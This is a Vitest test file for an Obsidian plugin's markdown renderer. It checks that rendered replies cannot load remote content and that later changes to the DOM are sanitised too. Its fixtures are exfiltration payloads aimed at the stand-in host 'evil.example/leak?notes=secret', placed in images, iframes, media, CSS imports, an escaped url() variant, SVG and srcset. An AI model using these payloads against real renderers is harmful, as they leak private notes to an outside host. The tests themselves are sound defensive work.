// @vitest-environment happy-dom
import { afterEach, describe, expect, it, vi } from "vitest";
import { flushSync, mount, unmount } from "svelte";
import { Component, MarkdownRenderer, type App } from "obsidian";
import Markdown from "../src/ui/components/Markdown.svelte";
import { renderMarkdown } from "../src/ui/lib/markdown";
import { store } from "../src/ui/lib/store.svelte";
import { fixture } from "./helpers";

// Obsidian adds this to every element.
Object.defineProperty(HTMLElement.prototype, "empty", { configurable: true, value() { this.replaceChildren(); } });

afterEach(() => {
  vi.restoreAllMocks();
  document.body.replaceChildren();
});

const EVIL = "https://evil.example/leak?notes=secret";

/** Stand in for Obsidian's renderer: write the HTML it would produce, and note where. */
function renderAs(html: string, later?: string) {
  const targets: HTMLElement[] = [];
  vi.spyOn(MarkdownRenderer, "render").mockImplementation(async (_app, _md, el) => {
    targets.push(el);
    el.innerHTML = html;
    if (later) setTimeout(() => el.insertAdjacentHTML("beforeend", later), 0);
    // Like Obsidian's in an inert document: it waits for images that never load.
    return new Promise<void>(() => {});
  });
  return targets;
}

function render(html: string, later?: string) {
  const targets = renderAs(html, later);
  const view = document.body.appendChild(document.createElement("div"));
  const owner = new Component();
  const stop = renderMarkdown({} as App, "reply", view, owner);
  return { view, targets, stop };
}

describe("rendering replies", () => {
  it("renders where nothing can load, then shows the result", () => {
    const { view, targets } = render("<p>Hello <strong>there</strong></p>");
    expect(targets[0].ownerDocument).not.toBe(document);
    expect(targets[0].ownerDocument.defaultView).toBeNull();
    expect(view.innerHTML).toBe("<p>Hello <strong>there</strong></p>");
  });

  it("turns remote images into links and keeps local ones", () => {
    const { view } = render(`<p>See <img alt="diagram" src="${EVIL}"> and <img src="app://local/vault/pic.png" alt="mine"> or <img src="//evil.example/x"></p>`);
    const imgs = [...view.querySelectorAll("img")];
    expect(imgs.map((i) => i.getAttribute("src"))).toEqual(["app://local/vault/pic.png"]);
    const link = view.querySelector("a")!;
    expect(link.textContent).toBe("diagram");
    expect(link.getAttribute("href")).toBe(EVIL);
    expect(view.textContent).toContain("image");
  });

  it("drops frames, media, styles and anything else that would fetch", () => {
    const { view } = render(
      `<iframe src="${EVIL}"></iframe>` +
        `<p>a<video src="${EVIL}" poster="${EVIL}"></video><audio><source src="${EVIL}"></audio><object data="${EVIL}"></object><embed src="${EVIL}"></p>` +
        `<style>@import url(${EVIL});</style><link rel="stylesheet" href="${EVIL}">` +
        `<p style="background: url(${EVIL})">b</p><p style="background: u\\72l(${EVIL})">c</p><p style="text-align: center">d</p>` +
        `<svg><image href="${EVIL}"></image><use href="${EVIL}#x"></use><rect fill="url(${EVIL}#p)"></rect></svg>` +
        `<p><img src="app://local/a.png" srcset="${EVIL} 2x"></p>`,
    );
    expect(view.innerHTML).not.toContain("evil.example");
    expect(view.querySelector("p[style]")!.getAttribute("style")).toBe("text-align: center");
    expect(view.querySelector("img")!.getAttribute("src")).toBe("app://local/a.png");
  });

  it("checks output that arrives after the first pass too", async () => {
    const { view } = render("<p>first</p>", `<p>late <img src="${EVIL}" alt="late"></p><iframe src="${EVIL}"></iframe>`);
    await new Promise((r) => setTimeout(r, 10));
    expect(view.textContent).toBe("firstlate late");
    expect(view.innerHTML).not.toContain("<img");
    expect(view.innerHTML).not.toContain("iframe");
  });

  it("checks later changes deep inside what's already shown", async () => {
    const { view, targets } = render(`<p>Shown <span class="slot"></span> <img class="local" src="app://local/a.png"></p>`);
    const original = targets[0];
    // What Obsidian does after its first pass, from an embed loading to a processor setting a source.
    original.querySelector(".slot")!.innerHTML = `<img alt="late" src="${EVIL}"><iframe src="${EVIL}"></iframe>`;
    original.querySelector(".local")!.setAttribute("src", EVIL);
    original.querySelector("p")!.setAttribute("style", `background: url(${EVIL})`);
    await Promise.resolve();
    expect(view.querySelectorAll("img, iframe")).toHaveLength(0);
    expect([...view.querySelectorAll("a")].map((a) => a.textContent)).toEqual(["late", "image"]);
    expect(view.querySelector("p")!.hasAttribute("style")).toBe(false);
    // Nothing the renderer holds is ever in the view.
    for (const el of view.querySelectorAll("*")) expect(original.contains(el)).toBe(false);
  });

  it("passes clicks to Obsidian's own buttons on the original", async () => {
    const { view, targets } = render(`<pre><code>let a = 1</code><button class="copy-code-button"><svg><path></path></svg></button></pre><p><a class="external-link" href="https://example.com">site</a></p>`);
    const copy = vi.fn((e: Event) => e.preventDefault());
    const opened = vi.fn();
    targets[0].querySelector("button")!.addEventListener("click", copy);
    targets[0].querySelector("a")!.addEventListener("click", opened);
    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    view.querySelector("path")!.dispatchEvent(click);
    expect(copy).toHaveBeenCalledTimes(1);
    expect(click.defaultPrevented).toBe(true);
    // A link opens from the copy itself, not twice.
    view.querySelector("a")!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    expect(opened).not.toHaveBeenCalled();
  });

  it("unwraps an inline reply's paragraph", () => {
    const f = fixture();
    store.init(f.backend, () => f.settings, async () => {});
    renderAs("<p>Just <em>this</em></p>");
    const target = document.body.appendChild(document.createElement("div"));
    const cmp = mount(Markdown, { target, props: { md: "Just *this*", inline: true } });
    flushSync();
    expect(target.querySelector(".ct-inline")!.innerHTML).toBe("Just <em>this</em>");
    unmount(cmp);
  });
});
